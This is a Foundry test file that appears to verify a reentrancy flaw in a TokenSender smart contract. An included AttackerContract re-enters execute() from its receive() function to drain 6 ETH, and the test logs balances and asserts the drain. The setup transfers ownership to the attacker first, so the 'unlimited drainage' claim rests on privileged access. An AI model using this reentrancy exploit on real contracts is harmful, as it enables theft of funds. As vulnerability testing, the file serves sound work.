// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import "../src/0xec329ffc97d75fe03428ae155fc7793431487f63.sol";

contract TokenSenderReentrancyTest is Test {
    TokenSender public tokenSender;
    AttackerContract public attacker;
    address private originalOwner = address(0xA);
    uint256 public initialTokenSenderBalance = 10 ether;

    function setUp() public {
        vm.prank(originalOwner);
        tokenSender = new TokenSender(address(0));

        // Deploy attacker contract
        attacker = new AttackerContract(tokenSender);

        // Transfer ownership to attacker contract
        vm.prank(originalOwner);
        tokenSender.changeOwner(address(attacker));

        // Fund token sender contract
        vm.deal(address(tokenSender), initialTokenSenderBalance);
    }

    function testReentrancyVulnerability() public {
        uint256 numTransfers = attacker.MAX_RECURSIONS() + 1;
        uint256 expectedTransferAmount = 1 ether * numTransfers; // 6 ether

        // Record pre-attack state
        console2.log("--- BEFORE-Trigger Attack ---");
        uint256 tokenSenderBalanceBefore = address(tokenSender).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        console2.log("TokenSender pre-attack balance:", tokenSenderBalanceBefore);
        console2.log("Attacker pre-attack balance:", attackerBalanceBefore);

        console2.log("--- Trigger Attack ---");
        attacker.attack(); // Execute reentrancy attack

        // Record post-attack state
        console2.log("--- AFTER-Trigger Attack ---");
        uint256 tokenSenderBalanceAfter = address(tokenSender).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        console2.log("TokenSender post-attack balance:", tokenSenderBalanceAfter);
        console2.log("Attacker post-attack balance:", attackerBalanceAfter);

        // Calculate changes
        uint256 tokenSenderBalanceDiff = tokenSenderBalanceBefore - tokenSenderBalanceAfter;
        uint256 attackerBalanceDiff = attackerBalanceAfter - attackerBalanceBefore;

        console2.log("TokenSender balance change:", tokenSenderBalanceDiff);
        console2.log("Attacker balance change:", attackerBalanceDiff);

        // Vulnerability verification
        if (attackerBalanceDiff == expectedTransferAmount && tokenSenderBalanceDiff == expectedTransferAmount) {
            console2.log("Vulnerability confirmed: 6 ETH successfully drained via reentrancy");
            console2.log("Vulnerability Exists: reentrancy allows unlimited fund drainage");
        } else {
            console2.log("Vulnerability detection failed: Unexpected balance changes");
            console2.log("Vulnerability not Exist: reentrancy protection is effective");
        }

        // Maintain original assertions
        assertEq(
            tokenSenderBalanceAfter, 
            initialTokenSenderBalance - expectedTransferAmount, 
            "Token sender balance after reentrancy"
        );
        assertEq(
            attackerBalanceAfter, 
            expectedTransferAmount, 
            "Attacker contract balance after reentrancy"
        );
        assertEq(
            attacker.reentrancyCount(), 
            attacker.MAX_RECURSIONS(), 
            "Should execute max recursions"
        );
    }
}

contract AttackerContract {
    TokenSender public tokenSender;
    uint256 public reentrancyCount = 0;
    uint256 public constant MAX_RECURSIONS = 5;

    constructor(TokenSender _tokenSender) {
        tokenSender = _tokenSender;
    }

    function attack() external {
        // Initial call triggers reentrancy in receive()
        tokenSender.execute(address(this), 1 ether, "");
    }

    receive() external payable {
        if (reentrancyCount < MAX_RECURSIONS) {
            reentrancyCount++;
            tokenSender.execute(address(this), 1 ether, "");
        }
    }
}